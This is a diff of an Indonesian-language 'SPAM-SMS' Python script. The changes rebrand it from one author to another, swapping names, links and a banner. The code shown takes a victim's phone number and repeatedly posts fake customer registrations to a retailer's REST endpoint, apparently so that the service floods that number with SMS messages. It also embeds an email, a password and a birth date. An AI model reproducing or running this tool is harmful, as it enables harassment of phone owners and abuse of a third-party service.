@@ -1,8 +1,8 @@
 # coding:utf8
 
-# CODED BY : KINGTEBE
-# GITHUB : https://github.com/KINGTEBE-404
-# Mau RIKOD ? Sertakan Sumber Anjim
+# CODED BY : Mr-S4NTUY
+# GITHUB : https://github.com/Mr-S4NTUY
+# Mau RIKOD ? IZIN DLU ANJING
 # Tinggal Pake Aja Susah Amat Sih ! JANGAN RIKOD ATUH :V
 
 import json,sys,time,random,os
@@ -44,7 +44,7 @@ class Akugans:
 			"accept-encoding":"gzip, deflate",
 			"accept-language": "id-ID,en-US;q=0.8"}
 
-		dat = json.dumps({"thor_customer":{"name":" Kingtebe","email_address":"BlackIT@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":____code08____,"mro":"","password":"Kingtebegans","birth_date":"06/03/2003"}})
+		dat = json.dumps({"thor_customer":{"name":" Mr-S4NTUY","email_address":"mrs4ntuy04@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":____code08____,"mro":"","password":"Tahlita23","birth_date":"06/03/2003"}})
 
 		ajig = self.ses.post("https://www.matahari.com/rest/V1/thorCustomers",headers=head,data=dat)
 		if "Succses" in ajig.text:
@@ -58,9 +58,9 @@ while True:
 		print("""
 	\x1b[93mSPAM-SMS
 
- \x1b[97m{\x1b[95m*\x1b[97m} Creator \x1b[90m: \x1b[97mKingtebe
- \x1b[97m{\x1b[95m*\x1b[97m} Youtube \x1b[90m: \x1b[97mBlack-IT
- \x1b[97m{\x1b[95m*\x1b[97m} Github  \x1b[90m: \x1b[92mhttps://github.com/KINGTEBE-404
+ \x1b[97m{\x1b[95m*\x1b[97m} Creator \x1b[90m: \x1b[97mMr-S4NTUY
+ \x1b[97m{\x1b[95m*\x1b[97m} Youtube \x1b[90m: \x1b[97mTUTORIAL ANDROID
+ \x1b[97m{\x1b[95m*\x1b[97m} Github  \x1b[90m: \x1b[92mhttps://github.com/Mr-S4NTUY
 \x1b[91m+\x1b[90m----------------------------------------------\x1b[91m+\n""")
 
 		print(" \x1b[93m! \x1b[97mExample \x1b[90m: \x1b[97m08xxxx ")
@@ -80,7 +80,7 @@ while True:
 		if _____exec_____ =='y':
 			Akugans()
 		elif _____exec_____ =='n':
-			print('\n \x1b[97mTHANK YOU SUDAH MENGGUNAKAN TOOLS INI \n')
+			print('\n \x1b[97mMAKASIH YA SAYANG UDAH MENGGUNAKAN SC INI JANGAN LUPA SUBS \n')
 			sys.exit()
 	except Exception as Error:
 		sys.exit(Error)
